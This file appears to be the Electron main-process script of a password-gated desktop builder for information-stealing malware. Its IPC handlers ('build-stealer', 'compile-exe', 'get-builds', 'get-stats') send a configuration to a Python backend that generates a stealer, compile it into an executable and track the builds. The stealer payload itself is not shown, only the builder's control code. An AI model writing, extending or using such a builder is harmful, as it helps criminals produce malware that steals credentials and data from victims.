const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron')
const path = require('path')
const { spawn } = require('child_process')
const fs = require('fs')

let win
let pyBackend

function createWindow() {
  win = new BrowserWindow({
    width: 1400,
    height: 900,
    backgroundColor: '#1a1d23',
    titleBarStyle: 'hiddenInset',
    show: false,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false
    }
  })
  
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'))
  
  win.once('ready-to-show', () => {
    win.show()
    win.maximize()
  })
}

app.whenReady().then(() => {
  createWindow()
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit()
})

ipcMain.handle('check-password', async (event, password) => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result.result || false)
        } catch {
          resolve(false)
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'check_password', params: { password } }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return false
  }
})

ipcMain.handle('build-stealer', async (event, config) => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', message: 'Failed to parse response' })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'build', params: config }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', message: error.message }
  }
})

ipcMain.handle('compile-exe', async (event, pyPath, name) => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
        win.webContents.send('compile-log', data.toString())
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', message: 'Failed to parse response' })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'compile', params: { path: pyPath, name } }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', message: error.message }
  }
})

ipcMain.handle('get-builds', async () => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', builds: [] })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'get_builds' }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', builds: [] }
  }
})

ipcMain.handle('get-stats', async () => {
  try {
    const pythonExe = process.platform === 'win32' ? 'python' : 'python3'
    const script = path.join(__dirname, 'builder_backend.py')
    
    const py = spawn(pythonExe, [script], { stdio: ['pipe', 'pipe', 'pipe'] })
    
    return new Promise((resolve) => {
      let output = ''
      
      py.stdout.on('data', (data) => {
        output += data.toString()
      })
      
      py.on('close', () => {
        try {
          const result = JSON.parse(output.trim())
          resolve(result)
        } catch {
          resolve({ status: 'error', stats: {} })
        }
      })
      
      py.stdin.write(JSON.stringify({ cmd: 'get_stats' }) + '\n')
      py.stdin.end()
    })
  } catch (error) {
    return { status: 'error', stats: {} }
  }
})

ipcMain.handle('open-builds-folder', async () => {
  try {
    const buildsPath = path.join(__dirname, '..', 'builds')
    if (fs.existsSync(buildsPath)) {
      shell.openPath(buildsPath)
      return true
    }
    return false
  } catch (error) {
    return false
  }
})

ipcMain.handle('set-opacity', async (event, opacity) => {
  try {
    const window = BrowserWindow.getFocusedWindow() || win
    if (window) {
      window.setOpacity(parseFloat(opacity))
      return true
    }
    return false
  } catch (error) {
    return false
  }
})

ipcMain.handle('pick-folder', async () => {
  const result = await dialog.showOpenDialog(win, { 
    properties: ['openDirectory'],
    title: 'Выберите папку для сохранения'
  })
  if (result.canceled || !result.filePaths[0]) return null
  return result.filePaths[0]
})
